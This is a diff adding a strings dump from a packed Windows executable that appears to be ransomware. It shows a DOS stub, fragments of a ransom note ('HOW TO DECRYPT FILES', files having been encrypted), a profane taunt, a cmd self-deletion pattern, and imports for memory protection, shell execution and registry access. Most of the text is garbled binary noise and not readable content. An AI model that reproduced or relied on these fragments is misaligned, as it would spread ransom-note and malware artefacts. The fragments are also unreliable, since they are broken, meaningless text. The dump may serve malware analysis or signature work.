@@ -1,0 +1,57 @@
+!This program cannot be run in DOS mode.
+hANP,,;
+:\*.8U
+!^*+T3
+fw]=^i
+bw|bw18$N4
+0F"hb,
+:v7=Rr
+ComSpec
+/c del "
+" >> NUL
+aRg<xK
+Cle/!z
+0p3nSOurc
+3 X0r157, motherfuck!
+HOW TO DECRYPT FILES
+iles have befJcr
+ypted s
+w<iSinc
+~ntionWA
+ yoY f.X+
+VXachOu
+vocabq
+&DoD4lo[+
+REG_SZ
+WA2\MiW
+N9Q2 ,
+lstrlenAC
+EnvMonm
+imLogicalD.v,
+>Modu $NaA
++,+r]F
+TAcquH
+1k/$T#"
+;,4G|r
+qcPNkMk
+DlgITcEI
+XPTPSW
+KERNEL32.DLL
+advapi32.dll
+comctl32.dll
+gdi32.dll
+shell32.dll
+shlwapi.dll
+user32.dll
+LoadLibraryA
+GetProcAddress
+VirtualProtect
+VirtualAlloc
+VirtualFree
+ExitProcess
+RegCloseKey
+InitCommonControls
+CreateFontIndirectA
+ShellExecuteA
+PathMatchSpecA
+EndPaint
